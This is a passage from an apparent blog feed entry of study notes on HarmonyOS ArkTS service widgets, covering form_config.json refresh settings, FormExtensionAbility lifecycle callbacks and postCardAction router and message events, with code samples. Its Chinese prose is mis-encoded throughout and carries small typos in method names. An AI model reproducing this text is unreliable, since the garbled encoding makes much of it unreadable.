    <id>https://banjinmei.github.io/2024/12/13/%E9%B8%BF%E8%92%99%E5%BA%94%E7%94%A8-%E5%9F%BA%E4%BA%8EArkTS%E5%8D%A1%E7%89%87%E5%BC%80%E5%8F%91-HarmonyOS%E6%9C%8D%E5%8A%A1%E5%8D%A1%E7%89%87/</id>
    <published>2024-12-13T14:45:30.000Z</published>
    <updated>2024-12-13T16:18:19.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡"><a href="#é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡" class="headerlink" title="é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡"></a>é¸¿è’™åº”ç”¨-åŸºäºArkTSå¡ç‰‡å¼€å‘-HarmonyOSæœåŠ¡å¡ç‰‡</h1><h1 id="æœåŠ¡å¡ç‰‡æ¶æ„"><a href="#æœåŠ¡å¡ç‰‡æ¶æ„" class="headerlink" title="æœåŠ¡å¡ç‰‡æ¶æ„"></a>æœåŠ¡å¡ç‰‡æ¶æ„</h1><p>å¡ç‰‡ä½¿ç”¨æ–¹ æä¾›æ–¹</p><h1 id="ArkTSå¡ç‰‡åˆ›å»º"><a href="#ArkTSå¡ç‰‡åˆ›å»º" class="headerlink" title="ArkTSå¡ç‰‡åˆ›å»º"></a>ArkTSå¡ç‰‡åˆ›å»º</h1><p>åˆ›å»ºæ­¥éª¤ å¡ç‰‡ç›¸å…³æ–‡ä»¶ï¼ˆå¡ç‰‡ç”Ÿå‘½å‘¨æœŸç®¡ç†æ–‡ä»¶ å¡ç‰‡é¡µé¢æ–‡ä»¶ å¡ç‰‡é…ç½®æ–‡ä»¶ï¼‰ </p><h1 id="ArkTSç”Ÿå‘½å‘¨æœŸ"><a href="#ArkTSç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="ArkTSç”Ÿå‘½å‘¨æœŸ"></a>ArkTSç”Ÿå‘½å‘¨æœŸ</h1><h1 id="ArkTSå¡ç‰‡äº‹ä»¶å¼€å‘"><a href="#ArkTSå¡ç‰‡äº‹ä»¶å¼€å‘" class="headerlink" title="ArkTSå¡ç‰‡äº‹ä»¶å¼€å‘"></a>ArkTSå¡ç‰‡äº‹ä»¶å¼€å‘</h1><p>router message call</p><h1 id="æœåŠ¡å¡ç‰‡çš„å®šä¹‰åŠåŸºæœ¬æ¦‚å¿µ"><a href="#æœåŠ¡å¡ç‰‡çš„å®šä¹‰åŠåŸºæœ¬æ¦‚å¿µ" class="headerlink" title="æœåŠ¡å¡ç‰‡çš„å®šä¹‰åŠåŸºæœ¬æ¦‚å¿µ"></a>æœåŠ¡å¡ç‰‡çš„å®šä¹‰åŠåŸºæœ¬æ¦‚å¿µ</h1><h2 id="å¡ç‰‡å®šä¹‰"><a href="#å¡ç‰‡å®šä¹‰" class="headerlink" title="å¡ç‰‡å®šä¹‰"></a>å¡ç‰‡å®šä¹‰</h2><p>ä½œä¸ºä¸€ç§ç•Œé¢å±•ç¤ºå½¢å¼ï¼Œå¯å°†é‡è¦ä¿¡æ¯æˆ–æ“ä½œå‰ç½®åˆ°å¡ç‰‡ï¼Œä»¥è¾¾åˆ°æœåŠ¡ç›´è¾¾ã€å‡å°‘ä½“éªŒå±‚çº§çš„ç›®çš„ã€‚<br>å¡ç‰‡å¸¸ç”¨äºåµŒå…¥å…¶ä»–ç³»ç»Ÿåº”ç”¨ä¸­ï¼Œä½œä¸ºå…¶é¡µé¢å±•ç¤ºçš„ä¸€éƒ¨åˆ†ï¼Œæ”¯æŒæ‹‰èµ·é¡µé¢ã€å‘é€æ¶ˆæ¯ç­‰åŸºç¡€äº¤äº’åŠŸèƒ½ã€‚</p><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p>å¡ç‰‡æä¾›æ–¹<br>åŒ…å«å¡ç‰‡çš„åº”ç”¨ï¼Œæä¾›å¡ç‰‡çš„æ˜¾ç¤ºå†…å®¹å¯ä»¥è¿›è¡Œäº¤äº’å¦‚ç•Œé¢åˆ·æ–°ã€åº”ç”¨è·³è½¬ç­‰ã€‚<br>å¡ç‰‡ä½¿ç”¨æ–¹<br>å¦‚å›¾ä¸­çš„æ¡Œé¢ï¼Œæ§åˆ¶å¡ç‰‡çš„å±•ç¤ºä½ç½®ã€‚</p><h2 id="æ”»å…‹éš¾ç‚¹"><a href="#æ”»å…‹éš¾ç‚¹" class="headerlink" title="æ”»å…‹éš¾ç‚¹"></a>æ”»å…‹éš¾ç‚¹</h2><p>1ã€åœ¨DevEco studioä¸­å¦‚ä½•åˆ›å»ºæœåŠ¡å¡ç‰‡?<br>2ã€æœåŠ¡å¡ç‰‡å¼€å‘æ¶‰åŠå“ªäº›é‡è¦çš„é…ç½®æ–‡ä»¶?<br>3ã€å¦‚ä½•ä½¿ç”¨routeräº‹ä»¶è·³è½¬åˆ°æŒ‡å®šUIAbilityï¼Œå®ç°æœåŠ¡ç›´è¾¾æ•ˆæœ?<br>4ã€å¦‚ä½•å®ç°å¡ç‰‡å†…å®¹çš„å®šç‚¹å’Œå®šæ—¶åˆ·æ–°?</p><h1 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h1><h2 id="åˆ›å»ºå¡ç‰‡"><a href="#åˆ›å»ºå¡ç‰‡" class="headerlink" title="åˆ›å»ºå¡ç‰‡"></a>åˆ›å»ºå¡ç‰‡</h2><p>é¡¹ç›®å†…å·¦ä¾§ entryå³é”® new service widget</p><p>ets&#x2F;entryformability<br>EntryFormAbility.ts ç”Ÿå‘½å‘¨æœŸæ–‡ä»¶<br>ets&#x2F;widget&#x2F;pages&#x2F;<br>WidgetCard.ets å¡ç‰‡é¡µé¢</p><p>form_config.json å¡ç‰‡é…ç½®<br>  â€œisDefaultâ€: true,   &#x2F;&#x2F;é»˜è®¤æ‹‰èµ·çš„å¡ç‰‡<br>      â€œupdateEnabledâ€: false,  &#x2F;&#x2F;è¡¨ç¤ºå¡ç‰‡æ˜¯å¦æ”¯æŒå‘¨æœŸæ€§åˆ·æ–°<br>      â€œscheduledUpdateTimeâ€: â€œ10:30â€,&#x2F;&#x2F;è¡¨ç¤ºå¡ç‰‡çš„å®šç‚¹å‰§æ–°æ—¶åˆ»ï¼Œé‡‡ç”¨24å°æ—¶åˆ¶ï¼Œç²¾ç¡®åˆ°åˆ†é’Ÿ<br>      â€œupdateDurationâ€: 1, &#x2F;&#x2F;è¡¨ç¤ºå¡ç‰‡å®šæ—¶å‰§æ–°çš„æ›´æ–°å‘¨æœŸï¼Œå•ä½ä¸º<strong>30åˆ†é’Ÿ</strong>ï¼Œä¸¤ç§æ–¹å¼ä»»é€‰å…¶ä¸€ï¼ŒåŒæ—¶é…ç½®ï¼Œå®šæ—¶åˆ·æ–°ä¼˜å…ˆç”Ÿæ•ˆ </p><p>main_pages.json è·¯ç”±</p><!-- module.json5abtexabt --><h2 id="è¿è¡Œ"><a href="#è¿è¡Œ" class="headerlink" title="è¿è¡Œ"></a>è¿è¡Œ</h2><p>å¡ç‰‡åˆ›å»ºå®Œæˆåï¼Œå¯ä»¥ç‚¹å‡»DevEcoStudioå¼€å‘å·¥å…·å³ä¸Šè§’çš„å¯åŠ¨æŒ‰é’®ï¼Œè¿è¡Œé¡¹ç›®æŸ¥çœ‹æ•ˆæœæ˜“é”™ç‚¹:é¼ æ ‡æŒ‰ä½å·¦é”®å‘ä¸Šå¿ƒæ‹–åŠ¨ï¼Œæ¢å‡ºæœåŠ¡å¡ç‰‡ã€‚</p><IMG><h2 id="åœ¨EntryFormAbility-tsæ–‡ä»¶ä¸­"><a href="#åœ¨EntryFormAbility-tsæ–‡ä»¶ä¸­" class="headerlink" title="åœ¨EntryFormAbility.tsæ–‡ä»¶ä¸­"></a>åœ¨EntryFormAbility.tsæ–‡ä»¶ä¸­</h2><p>å®ç°äº†FormExtensionAbilityçš„ç”Ÿå‘½å‘¨æœŸæ¥å£ï¼Œå¼€å‘è€…å¯æ ¹æ®è‡ªèº«ä¸šåŠ¡éœ€æ±‚ï¼Œè°ƒç”¨å¯¹åº”çš„æ¥å£ã€‚<br>8å¤§ç”Ÿå‘½å‘¨æœŸ<br>export default class EntryFormAbility extends FormExtensionAbility {<br><strong>onAddForm(want)</strong> {..)}åˆ›å»ºå¡ç‰‡æ—¶è§¦å‘ â˜… ä¿¡æ¯ä¼ é€’<br><strong>onCastToNormalForm(formld)</strong> {â€¦}ä¸´æ—¶å¡ç‰‡è½¬å¸¸æ€å¡ç‰‡æ—¶è§¦å‘<br>**onUpdateForm(formid) **{..}å¡ç‰‡æ›´æ–°æ—¶è§¦å‘ â˜…<br><strong>onChangeFormVisibility(newStatus)</strong> {â€¦}ä¿®æ”¹å¡ç‰‡å¯è§æ€§æ—¶è§¦å‘<br><strong>onFormEvent(formld, message)</strong> {â€¦}å¤„ç†å¡ç‰‡äº‹ä»¶æ—¶è§¦å‘ â˜…<br><strong>onRemoveForm(formld)</strong>{â€¦}å¡ç‰‡é”€æ¯æ—¶è§¦å‘<br><strong>nConfigurationUpdate(config)</strong> {â€¦}ç³»ç»Ÿé…ç½®æ›´æ–°æ—¶è§¦å‘<br><strong>onAcquireFormState(want)</strong>{â€¦}æŸ¥è¯¢å¡ç‰‡çŠ¶æ€æ—¶è§¦å‘</p><h2 id="å¡ç‰‡äº‹ä»¶å¼€å‘"><a href="#å¡ç‰‡äº‹ä»¶å¼€å‘" class="headerlink" title="å¡ç‰‡äº‹ä»¶å¼€å‘"></a>å¡ç‰‡äº‹ä»¶å¼€å‘</h2><p>ArKTSå¡ç‰‡æä¾›äº†**postCardAction()**æ¥å£ï¼Œç”¨äºå¡ç‰‡å†…éƒ¨å’Œæä¾›æ–¹åº”ç”¨é—´çš„äº¤äº’ï¼Œå½“å‰æ”¯æŒrouterã€messageå’Œcallä¸‰ç§ç±»å‹çš„äº‹ä»¶ï¼Œä»…åœ¨å¡ç‰‡ä¸­å¯ä»¥è°ƒç”¨ã€‚</p><h2 id="å¡ç‰‡é¡µé¢æ–‡ä»¶-WidegetCard-ets"><a href="#å¡ç‰‡é¡µé¢æ–‡ä»¶-WidegetCard-ets" class="headerlink" title="å¡ç‰‡é¡µé¢æ–‡ä»¶(WidegetCard.ets)"></a>å¡ç‰‡é¡µé¢æ–‡ä»¶(WidegetCard.ets)</h2><p>postCardAction<br>-&gt; <strong>message</strong> -&gt;è§¦å‘onFormEvent<br>-&gt; FormExtensionAbility(EntryFormAbility.ts)</p><h2 id="å¡ç‰‡é¡µé¢æ–‡ä»¶-WidegetCard-ets-1"><a href="#å¡ç‰‡é¡µé¢æ–‡ä»¶-WidegetCard-ets-1" class="headerlink" title="å¡ç‰‡é¡µé¢æ–‡ä»¶(WidegetCard.ets)"></a>å¡ç‰‡é¡µé¢æ–‡ä»¶(WidegetCard.ets)</h2><p>postCardAction<br>-&gt;<strong>router</strong>-&gt;<br>é¦–æ¬¡å¯åŠ¨è§¦å‘onCreate<br>éé¦–æ¬¡å¯åŠ¨è§¦å‘onNewWant<br>UlAbility(EntryAbility.ts)<br>-&gt;<strong>call</strong>-&gt;<br>é¦–æ¬¡å¯åŠ¨è§¦å‘onCreate<br>UlAbility(EntryAbility.ts)</p><h2 id="å¡ç‰‡äº‹ä»¶-router"><a href="#å¡ç‰‡äº‹ä»¶-router" class="headerlink" title="å¡ç‰‡äº‹ä»¶-router"></a>å¡ç‰‡äº‹ä»¶-router</h2><p>ä½¿ç”¨routeräº‹ä»¶è·³è½¬åˆ°æŒ‡å®šUIAbilityã€‚&gt;åœ¨å¡ç‰‡é¡µé¢æ–‡ä»¶ä¸­è°ƒç”¨routeräº‹ä»¶èƒ½å¤Ÿå¿«é€Ÿæ‹‰èµ·å¡ç‰‡æä¾›æ–¹åº”ç”¨çš„æŒ‡å®šUIAbilityï¼Œå®ç°ä¸€é”®ç›´è¾¾çš„æ•ˆæœã€‚<br>åœ¨UlAbilityçš„EntryAbility.tsæ–‡ä»¶ä¸­æ¥æ”¶routeräº‹ä»¶å¹¶è·å–å‚æ•°ï¼Œæ ¹æ®ä¼ é€’çš„paramsä¸åŒï¼Œé€‰æ‹©æ‹‰èµ·ä¸åŒçš„é¡µé¢ã€‚</p><p>##å¡ç‰‡äº‹ä»¶-messageåˆ·æ–°å¡ç‰‡ (ç‚¹å‡» )<br>åœ¨EntryFormAbility.tsæ–‡ä»¶ä¸­çš„onFormEventç”Ÿå‘½å‘¨æœŸä¸­è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡ã€‚</p><h2 id="å¡ç‰‡äº‹ä»¶-æ•°æ®äº¤äº’"><a href="#å¡ç‰‡äº‹ä»¶-æ•°æ®äº¤äº’" class="headerlink" title="å¡ç‰‡äº‹ä»¶-æ•°æ®äº¤äº’"></a>å¡ç‰‡äº‹ä»¶-æ•°æ®äº¤äº’</h2><p>æœ‰æ—¶åœ¨åˆ·æ–°å¡ç‰‡å†…å®¹æ—¶ï¼Œæˆ‘ä»¬å¸Œæœ›å®ç°å®šæ—¶åˆ·æ–°æˆ–è€…å®šç‚¹åˆ·æ–°ï¼Œæ— éœ€æ‰‹åŠ¨åˆ·æ–°ã€‚å®šæ—¶åˆ·æ–°:è¡¨ç¤ºåœ¨ä¸€å®šæ—¶é—´é—´éš”å†…è°ƒç”¨<strong>onUpdateForm</strong>çš„ç”Ÿå‘½å‘¨æœŸå›è°ƒå‡½æ•°è‡ªåŠ¨åˆ·æ–°å¡ç‰‡å†…å®¹ã€‚å¯ä»¥åœ¨form config.jsoné…ç½®æ–‡ä»¶çš„updateDurationå­—æ®µä¸­è¿›è¡Œè®¾ç½®ã€‚å®šç‚¹åˆ·æ–°:è¡¨ç¤ºæ¯å¤©åœ¨æŸä¸ªæ—¶é—´ç‚¹åˆ·æ–°ï¼Œåœ¨form config.jsonæ–‡ä»¶çš„scheduledUpdateTimeå­—æ®µè¿›è¡Œè®¾ç½®ã€‚(è‡ªåŠ¨)</p><p>åœ¨è§¦å‘å®šæ—¶æˆ–å®šç‚¹åˆ·æ–°åï¼Œç³»ç»Ÿä¼šè°ƒç”¨ntryFormAbility.tsæ–‡ä»¶ä¸­çš„ç”Ÿå‘½å‘¨æœŸå›è°ƒonUpdateFormï¼Œåœ¨å›è°ƒä¸­å¯ä»¥ä½¿ç”¨updateFormè¿›è¡Œæä¾›æ–¹åˆ·æ–°å¡ç‰‡ã€‚</p><p>ä½¿ç”¨å£°æ˜å¼èŒƒå¼å¼€å‘ArkTSå¡ç‰‡é¡µé¢ï¼Œåœ¨<strong>WallPaperCard.ets</strong>æ–‡ä»¶ï¼ˆå³å¡ç‰‡çš„é¡µé¢æ–‡ä»¶ï¼‰ä¸­å®Œæˆå¡ç‰‡çš„UIç•Œé¢æ„å»º</p><h1 id="ä½¿ç”¨routeräº‹ä»¶è·³è½¬åˆ°æŒ‡å®šUIAbility"><a href="#ä½¿ç”¨routeräº‹ä»¶è·³è½¬åˆ°æŒ‡å®šUIAbility" class="headerlink" title="ä½¿ç”¨routeräº‹ä»¶è·³è½¬åˆ°æŒ‡å®šUIAbility"></a>ä½¿ç”¨routeräº‹ä»¶è·³è½¬åˆ°æŒ‡å®šUIAbility</h1><p>å½“æˆ‘ä»¬ç‚¹å‡»å¡ç‰‡æ—¶ï¼Œå¸Œæœ›è·³è½¬åˆ°åº”ç”¨çš„ä¸»é¡µé¢ï¼Œä»”ç»†åˆ†æï¼Œè¯¥åŠŸèƒ½å¯æ‹†åˆ†ä¸ºä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†å®ç°ï¼š</p><ul><li>é¦–å…ˆï¼Œåœ¨WallPaperCard.etså¡ç‰‡é¡µé¢ä¸­è°ƒç”¨<strong>postCardAction</strong>å‘æŒ‡å®šEntryAbilityå‘é€routeräº‹ä»¶ï¼Œå¹¶åœ¨äº‹ä»¶å†…å®šä¹‰éœ€è¦ä¼ é€’çš„å†…å®¹ã€‚</li><li>å…¶æ¬¡ï¼Œåœ¨EntryAbilityä¸­æ¥æ”¶routeräº‹ä»¶å¹¶è·å–å‚æ•°ï¼Œæ ¹æ®ä¼ é€’çš„paramsä¸åŒï¼Œé€‰æ‹©æ‹‰èµ·ä¸åŒçš„é¡µé¢ã€‚<br>åœ¨WallPaperCard.etså¡ç‰‡é¡µé¢ä¸­è°ƒç”¨<strong>postCardAction</strong>æ¥å£å‘EntryAbilityå‘é€routeräº‹ä»¶ï¼Œä»è€Œæ‹‰èµ·EntryAbilityï¼›æ­¤æ—¶ï¼Œåªéœ€åœ¨WallPaperCard.etsçš„é¡µé¢å¸ƒå±€ä¸­è®¾å®šä¸€ä¸ªç‚¹å‡»äº‹ä»¶ï¼Œå½“ç”¨æˆ·ç‚¹å‡»å¡ç‰‡æ—¶ï¼Œå³å¯è·³è½¬è‡³åº”ç”¨çš„è¯¦æƒ…é¡µé¢ï¼Œè¿™é‡Œç»™æœ€å¤–å±‚çš„æ ¹å®¹å™¨ç»„ä»¶Rowç»‘å®šä¸€ä¸ªç‚¹å‡»äº‹ä»¶ï¼Œåœ¨å…¶ä¸­å®Œæˆè°ƒç”¨<strong>postCardAction</strong>æ¥å£å‘EntryAbilityå‘é€routeräº‹ä»¶çš„æ“ä½œ</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//WallPaperCard.ets</span></span><br><span class="line">    .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">//ä½¿ç”¨router,æ‹‰èµ·EntryAbilityå¹¶è·³è½¬åˆ°å¯¹åº”çš„è¯¦æƒ…é¡µé¢</span></span><br><span class="line">      <span class="title function_">postCardAction</span>(<span class="variable language_">this</span>, &#123;</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="variable language_">this</span>.<span class="property">ACTION_TYPE</span>,</span><br><span class="line">        <span class="string">&quot;abilityName&quot;</span>: <span class="variable language_">this</span>.<span class="property">ABILITY_NAME</span>,</span><br><span class="line">        <span class="string">&quot;params&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;targetPage&#x27;</span>: <span class="string">&#x27;home&#x27;</span> <span class="comment">// åœ¨EntryAbilityä¸­å¤„ç†è¿™ä¸ªä¿¡æ¯</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>åœ¨WallPaperCard.etså¡ç‰‡é¡µé¢ä¸­å‘EntryAbilityå‘é€routeräº‹ä»¶åï¼Œéœ€è¦åœ¨EntryAbility.tsæ–‡ä»¶ä¸­æ¥æ”¶routeräº‹ä»¶ï¼Œå¹¶è·å–äº‹ä»¶ä¸­æºå¸¦çš„å‚æ•°ï¼Œé€šè¿‡ä¼ é€’çš„å‚æ•°é€‰æ‹©æ‹‰èµ·ä¸åŒçš„é¡µé¢ï¼Œè¿™é‡Œæ˜¯æ‹‰èµ·ä¸»é¡µé¢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//EntryAbility.ts</span></span><br><span class="line"> <span class="title function_">onCreate</span>(<span class="params">want, launchParam</span>) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœUIAbilityç¬¬ä¸€æ¬¡å¯åŠ¨ï¼Œåœ¨æ”¶åˆ°å¡ç‰‡çš„Routeräº‹ä»¶åä¼šè§¦å‘onCreateç”Ÿå‘½å‘¨æœŸå›è°ƒ</span></span><br><span class="line">    <span class="comment">// è·å–routeräº‹ä»¶ä¸­ä¼ é€’çš„targetPageå‚æ•°</span></span><br><span class="line">    <span class="keyword">if</span> (want.<span class="property">parameters</span>.<span class="property">params</span> !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> params = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(want.<span class="property">parameters</span>.<span class="property">params</span>);</span><br><span class="line">      selectPage = params.<span class="property">targetPage</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¦‚æœUIAbilityæ˜¯éé¦–æ¬¡å¯åŠ¨ï¼Œåœ¨æ”¶åˆ°å¡ç‰‡Routeräº‹ä»¶åä¼šè§¦å‘onNewWantç”Ÿå‘½å‘¨æœŸå›è°ƒ</span></span><br><span class="line">  <span class="title function_">onNewWant</span>(<span class="params">want, launchParam</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (want.<span class="property">parameters</span>.<span class="property">params</span> !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="comment">// åŒæ ·,è·å–routeräº‹ä»¶ä¸­ä¼ é€’çš„targetPageå‚æ•°</span></span><br><span class="line">      <span class="keyword">let</span> params = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(want.<span class="property">parameters</span>.<span class="property">params</span>);</span><br><span class="line">      selectPage = params.<span class="property">targetPage</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (currentWindowStage != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">onWindowStageCreate</span>(currentWindowStage);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="ä½¿ç”¨message-äº‹ä»¶åˆ·æ–°å¡ç‰‡å†…å®¹"><a href="#ä½¿ç”¨message-äº‹ä»¶åˆ·æ–°å¡ç‰‡å†…å®¹" class="headerlink" title="ä½¿ç”¨message äº‹ä»¶åˆ·æ–°å¡ç‰‡å†…å®¹"></a>ä½¿ç”¨message äº‹ä»¶åˆ·æ–°å¡ç‰‡å†…å®¹</h1><p>åœ¨å¡ç‰‡çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¸Œæœ›å¯ä»¥é€šè¿‡ç‚¹å‡»å¡ç‰‡ä¸­çš„åˆ·æ–°æŒ‰é’®ï¼Œå®ç°å¡ç‰‡å†…å®¹çš„æ›´æ–°ï¼Œæ­¤æ—¶å¯ä»¥åœ¨WallPaperCard.etsä¸­è°ƒç”¨postCardActionæ¥å£è§¦å‘messageäº‹ä»¶æ‹‰èµ·FormExtensionAbilityï¼Œç„¶åç”±FormExtensionAbilityåˆ·æ–°å¡ç‰‡å†…å®¹ã€‚<br>ä»”ç»†åˆ†æï¼Œä¸Šè¿°æ•ˆæœå¯æ‹†åˆ†ä¸ºä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†å®ç°ï¼š</p><ul><li>é¦–å…ˆï¼Œåœ¨å¡ç‰‡é¡µé¢ä¸­ç»™Buttonç»„ä»¶ç»‘å®šç‚¹å‡»äº‹ä»¶ï¼Œåœ¨å…¶ä¸­è°ƒç”¨<strong>postCardAction</strong>æ¥å£è§¦å‘messageäº‹ä»¶æ‹‰èµ·FormExtensionAbilityã€‚</li><li>å…¶æ¬¡ï¼Œåœ¨EntryFormAbility.tsçš„onFormEventç”Ÿå‘½å‘¨æœŸä¸­è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡ã€‚<br>åœ¨WallPaperCard.etså¡ç‰‡é¡µé¢ä¸­ç»™Buttonç»„ä»¶ç»‘å®šç‚¹å‡»äº‹ä»¶ï¼Œåœ¨å…¶ä¸­è°ƒç”¨<strong>postCardAction</strong>æ¥å£è§¦å‘messageäº‹ä»¶æ‹‰èµ·FormExtensionAbility</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">//ç‚¹å‡»åˆ·æ–°æŒ‰é’®,é€šè¿‡messageäº‹ä»¶åˆ·æ–°å¡ç‰‡æ•°æ®</span></span><br><span class="line">           <span class="title function_">postCardAction</span>(<span class="variable language_">this</span>, &#123;</span><br><span class="line">             <span class="string">&#x27;action&#x27;</span>: <span class="variable language_">this</span>.<span class="property">ACTION_TYPE2</span>,</span><br><span class="line">             <span class="string">&#x27;params&#x27;</span>: &#123;</span><br><span class="line">               <span class="string">&#x27;msgTest&#x27;</span>: <span class="string">&#x27;messageEvent&#x27;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;);</span><br><span class="line">         &#125;)</span><br></pre></td></tr></table></figure><p>åœ¨EntryFormAbility.tsçš„onFormEventç”Ÿå‘½å‘¨æœŸä¸­è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">onFormEvent</span>(<span class="params">formId, message</span>) &#123;</span><br><span class="line">  <span class="comment">// é€šè¿‡messagesäº‹ä»¶åˆ·æ–°,å°±ä¼šè§¦å‘è¯¥å›è°ƒ</span></span><br><span class="line">  <span class="keyword">let</span> formData = &#123;</span><br><span class="line">    <span class="string">&#x27;recommend&#x27;</span>: <span class="string">&#x27;messageåˆ·æ–°&#x27;</span>, <span class="comment">//è¦åˆ·æ–°çš„å…·ä½“å†…å®¹ï¼Œå’Œå¡ç‰‡å¸ƒå±€ä¸­å¯¹åº”</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">let</span> formInfo = formBindingData.<span class="title function_">createFormBindingData</span>(formData)</span><br><span class="line">  <span class="comment">//è°ƒç”¨updateFormæ¥å£åˆ·æ–°å¡ç‰‡</span></span><br><span class="line">  formProvider.<span class="title function_">updateForm</span>(formId, formInfo).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&#x27;FormAbility updateForm success.&#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data));</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;FormAbility updateForm failed: &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(error));</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å¡ç‰‡æ•°æ®äº¤äº’"><a href="#å¡ç‰‡æ•°æ®äº¤äº’" class="headerlink" title="å¡ç‰‡æ•°æ®äº¤äº’"></a>å¡ç‰‡æ•°æ®äº¤äº’</h1><h2 id="å¡ç‰‡çš„å®šæ—¶åˆ·æ–°"><a href="#å¡ç‰‡çš„å®šæ—¶åˆ·æ–°" class="headerlink" title="å¡ç‰‡çš„å®šæ—¶åˆ·æ–°"></a>å¡ç‰‡çš„å®šæ—¶åˆ·æ–°</h2><p>åœ¨å¡ç‰‡çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬å¸Œæœ›å¡ç‰‡çš„å†…å®¹å¯ä»¥å®šæ—¶è‡ªåŠ¨åˆ·æ–°,æ¯”å¦‚æ¯éš”0.5å°æ—¶åˆ·æ–°ä¸€æ¬¡ï¼›å®šæ—¶åˆ·æ–°çš„åŠŸèƒ½æ•ˆæœï¼ŒåŒæ ·å¯æ‹†åˆ†ä¸ºä»¥ä¸‹ä¸¤ä¸ªéƒ¨åˆ†å®ç°ï¼š</p><ul><li>é¦–å…ˆï¼Œéœ€è¦åœ¨â€œresources&gt;base&gt;profileâ€ç›®å½•ä¸‹çš„form_config.jsoné…ç½®æ–‡ä»¶ä¸­å¯¹<strong>updateDuration</strong>å­—æ®µè¿›è¡Œè®¾ç½®ã€‚</li><li>å…¶æ¬¡ï¼Œåœ¨è§¦å‘å®šæ—¶åˆ·æ–°åï¼Œç³»ç»Ÿä¼šè°ƒç”¨EntryFormAbility.tsä¸­çš„onUpdateFormç”Ÿå‘½å‘¨æœŸå›è°ƒï¼Œåœ¨å›è°ƒä¸­ï¼Œå¯ä»¥ä½¿ç”¨updateFormè¿›è¡Œæä¾›æ–¹åˆ·æ–°å¡ç‰‡ã€‚<br>å®šæ—¶åˆ·æ–°çš„æ—¶é—´é—´éš”å•ä½ä¸º30åˆ†é’Ÿï¼Œå› 